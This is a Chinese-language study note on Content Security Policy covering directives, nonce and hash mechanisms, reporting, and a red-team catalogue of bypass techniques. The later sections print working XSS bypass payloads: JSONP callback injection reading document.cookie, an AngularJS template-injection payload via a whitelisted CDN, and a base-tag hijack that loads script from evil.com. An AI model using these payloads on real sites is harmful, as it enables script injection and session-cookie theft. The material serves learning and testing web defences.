## 目录

- [[#一、CSP基础语法|一、CSP基础语法]]
- [[#二、CSP指令详解|二、CSP指令详解]]
- [[#三、nonce与hash机制|三、nonce与hash机制]]
- [[#四、CSP报告机制|四、CSP报告机制]]
- [[#五、CSP绕过技术全集|五、CSP绕过技术全集]]
- [[#六、CSP绕过实战案例|六、CSP绕过实战案例]]
- [[#七、CSP评估与利用|七、CSP评估与利用]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、CSP基础语法

### CSP的两种设置方式

```html
<!-- 方式1：HTTP响应头（推荐） -->
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

<!-- 方式2：HTML meta标签（有限制） -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
<!-- 注意：meta不支持 report-uri, frame-ancestors, sandbox -->
```

### Report-Only模式

```
Content-Security-Policy-Report-Only: default-src 'self'
# 不阻止违反，只报告 → 用于测试阶段
```

### 基本指令结构

```
指令名    值1     值2      值3
script-src 'self' 'unsafe-inline' https://cdn.example.com
           ↑       ↑                ↑
         关键字    关键字           源表达式
```

## 二、CSP指令详解

### 资源指令（fetch directives）

| 指令 | 控制内容 | 默认继承 |
|------|---------|---------|
| `default-src` | 所有资源的默认策略 | - |
| `script-src` | JavaScript | default-src |
| `style-src` | CSS | default-src |
| `img-src` | 图片 | default-src |
| `connect-src` | fetch/XHR/WS/EventSource | default-src |
| `font-src` | 字体 | default-src |
| `media-src` | 视频/音频 | default-src |
| `object-src` | Flash/Java插件 | default-src |
| `frame-src` | iframe内容 | default-src |
| `worker-src` | Web Worker | default-src（升级后） |
| `manifest-src` | Web App Manifest | default-src |

### 文档指令

| 指令 | 控制内容 |
|------|---------|
| `base-uri` | `<base>`标签的href |
| `frame-ancestors` | 谁可以嵌入此页面（替代X-Frame-Options） |
| `sandbox` | iframe沙箱策略 |
| `form-action` | 表单提交目标 |

### 导航指令

| 指令 | 控制内容 |
|------|---------|
| `navigate-to` | 文档导航去哪里 |
| `upgrade-insecure-requests` | 自动升级http为https |
| `block-all-mixed-content` | 阻止混合内容 |

### 源表达式

| 表达式 | 含义 | 安全度 |
|--------|------|:---:|
| `*` | 任意源 | ✗ |
| `'none'` | 不允许任何源 | ✓ |
| `'self'` | 同源 | ✓ |
| `'unsafe-inline'` | 允许内联脚本/样式 | ✗ |
| `'unsafe-eval'` | 允许eval() | ✗ |
| `'unsafe-hashes'` | 允许hash匹配的内联 | △ |
| `'strict-dynamic'` | 信任已允许脚本动态创建的脚本 | △ |
| `https:` | 任意HTTPS源 | ✗ |
| `data:` | data: URI | ✗ |
| `blob:` | blob: URI | △ |
| `https://cdn.com` | 指定主机 | ✓ |
| `https://*.example.com` | 通配符子域 | △ |

## 三、nonce与hash机制

### nonce（随机数）

```html
<!-- CSP响应头 -->
Content-Security-Policy: script-src 'nonce-rAnd0m123'

<!-- 合法脚本 -->
<script nonce="rAnd0m123">
  console.log('This script is allowed');
</script>

<!-- 攻击者注入的脚本（无正确nonce）→ 被阻止 -->
<script>
  alert('XSS blocked by CSP!');
</script>
```

**关键：nonce必须在每次响应中随机生成，否则可被预测！**

### hash（哈希值）

```html
<!-- 合法内联脚本的hash -->
<script>console.log('Hello');</script>

<!-- CSP用hash允许它 -->
Content-Security-Policy: script-src 'sha256-RFWPLDbv2BY+rC...='

<!-- 计算hash -->
echo -n "console.log('Hello');" | openssl dgst -sha256 -binary | base64
```

### strict-dynamic

```html
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-abc123'

<!-- strict-dynamic会信任nonce允许的脚本所创建的脚本 -->
<script nonce="abc123">
  // 这个脚本可以动态创建其他script标签
  var s = document.createElement('script');
  s.src = 'https://cdn.com/helper.js';  // ← 会被允许！
  document.body.appendChild(s);
</script>

<!-- 优势：不需要列出所有CDN -->
<!-- 劣势：如果nonce泄露，攻击者可加载任意远程脚本 -->
```

## 四、CSP报告机制

### report-uri（已废弃）→ report-to（新）

```http
Content-Security-Policy: default-src 'self'; report-uri /csp-report

# 当违反CSP时，浏览器发送POST到 /csp-report：
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/exploit.js",
    "original-policy": "default-src 'self'; ...",
    "source-file": "https://example.com/page",
    "line-number": 45
  }
}
```

### 红队利用CSP报告

1. **信息泄露**：CSP报告中可能包含敏感URL、页面路径
2. **CSP策略探测**：分析report-uri可以发现CSP设置，为绕路铺垫
3. **DoS**：大量违反CSP可能导致报告端点被轰炸

## 五、CSP绕过技术全集

### 绕过矩阵

| CSP配置 | 绕过技术 |
|---------|---------|
| `script-src 'self'` | JSONP、AngularJS、文件上传JS、相对路径劫持 |
| `script-src 'unsafe-inline'` | 直接注入`<script>`或事件属性 |
| `script-src 'unsafe-eval'` | `eval()`, `new Function()`, `setTimeout()` 字符串 |
| `script-src 'nonce-...'` | DOM XSS（nonce不保护动态插入内容）、窃取nonce |
| `script-src 'strict-dynamic'` | 如果nonce泄露→加载任意远程脚本 |
| 缺少`object-src` | `<object data="data:text/html,...">` |
| 缺少`base-uri` | `<base href="https://evil.com">` 劫持相对路径 |
| `script-src https:` | CDN上托管的Angular/JSONP等可利用库 |
| `img-src *` | 外泄数据可通过Image（但不能执行JS） |
| `connect-src *` | 可fetch数据到任意服务器 |

### JSONP绕过（script-src 'self'）

```
1. 目标网站有JSONP接口：/api/data?callback=alert(1)
2. script-src 允许 'self'
3. 注入：<script src="/api/data?callback=alert(1)"></script>
4. 返回：alert(1)({"data":"..."}) → alert(1)被执行！
```

### AngularJS绕过（script-src 'self' + CDN）

```html
<!-- 如果目标网站加载了AngularJS（通过允许的CDN） -->
<!-- CSP: script-src 'self' cdnjs.cloudflare.com -->
<div ng-app ng-csp>
  {{constructor.constructor('alert(1)')()}}
</div>
<!-- AngularJS在页面上解析{{}}表达式 → 执行alert(1) -->
<!-- 绕过CSP！因为AngularJS本身是合法加载的 -->
```

### base-uri绕过

```html
<!-- CSP缺少base-uri限制 -->
<base href="https://evil.com/">
<script src="js/app.js"></script>
<!-- 浏览器去 https://evil.com/js/app.js 加载！ -->
<!-- 如果evil.com上放了恶意app.js → XSS -->
```

### iframe + srcdoc绕过

```html
<!-- 如果frame-src宽松 -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<!-- srcdoc内可以执行任意脚本，因为它的源是父页面 -->
```

## 六、CSP绕过实战案例

### 案例1：通过JSONP绕过 script-src 'self'

```
CSP: default-src 'self'; script-src 'self'
目标站点：https://target.com

Step 1: 发现JSONP端点
GET /api/search?q=test&callback=handleResult
返回：handleResult({"results":[]})

Step 2: 尝试注入callback
GET /api/search?q=test&callback=alert(1)
返回：alert(1)({"results":[]})
→ alert(1)会被执行！

Step 3: 构造XSS payload
<script src="/api/search?q=test&callback=alert(document.cookie)"></script>
→ 通过CSP！
```

### 案例2：通过CDN库绕过

```
CSP: script-src 'self' cdnjs.cloudflare.com; object-src 'none'

Step 1: 在cdnjs上搜索可利用的库
→ AngularJS 1.6.0（无沙箱版本）存在于cdnjs

Step 2: 加载AngularJS
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
→ 通过CSP（cdnjs.cloudflare.com在script-src白名单中）

Step 3: CSTI Payload
<div ng-app>
  {{constructor.constructor('alert(1)')()}}
</div>
→ Angular解析模板 → 执行JS → 绕过CSP！
```

### 案例3：缺少object-src

```
CSP: default-src 'self'; script-src 'self'; (缺少object-src)

Payload:
<object data="data:text/html,<script>alert(1)</script>"></object>
→ object-src默认继承default-src 'self'
→ 但如果default-src 'self'未覆盖object → 某些浏览器有漏洞
```

## 七、CSP评估与利用

### CSP评估检查清单

```bash
# 1. 检查script-src
→ 有'unsafe-inline'？ → XSS直接注入script
→ 有'unsafe-eval'？ → eval()可用
→ 有*或data:？ → 极其宽松

# 2. 检查object-src
→ 缺失或允许*？ → <object>/<embed>可能可注入

# 3. 检查base-uri
→ 缺失或过于宽松？ → base标签劫持

# 4. 检查connect-src
→ 允许*？ → 可向任意服务器发送窃取数据

# 5. 检查form-action
→ 缺失或*？ → 可CSRF到任意服务器

# 6. 检查frame-ancestors
→ 缺失？ → 可Clickjacking

# 7. 检查是否有report-uri
→ 有？ → CSP违例会上报=信息泄露
```

### Google CSP Evaluator

```
在线工具：https://csp-evaluator.withgoogle.com/
输入CSP策略，自动检测弱点和降级风险
```

## 八、红队视角总结

### CSP攻击策略决策树

```
发现CSP → 
├─ script-src 'unsafe-inline' → 直接XSS！
├─ script-src 'unsafe-eval' → eval()注入
├─ script-src 'self' →
│   ├─ 有JSONP端点 → JSONP回调注入
│   ├─ 有AngularJS → ng-app CSTI
│   ├─ 有文件上传 → 上传JS文件 + 同源加载
│   └─ 无以上 → 尝试CDN资源利用
├─ script-src 'nonce-xxx' →
│   ├─ DOM XSS？→ nonce不保护动态插入
│   ├─ dangling markup？→ 窃取nonce
│   └─ 原型链污染劫持nonce生成？
├─ 缺少object-src → <object>注入
├─ 缺少base-uri → <base>劫持
└─ 顽固CSP → CSS注入、其他侧信道
```

### CSP绕过工具

| 工具 | 用途 |
|------|------|
| Google CSP Evaluator | 策略弱点分析 |
| CSP Bypass (PortSwigger) | Burp插件检测CSP |
| AutoCSP | 自动寻找CSP绕过路径 |
| https://csp-evaluator.withgoogle.com/ | 在线评估 |

---
**返回** [[../前端基础总目录|前端基础总目录]]
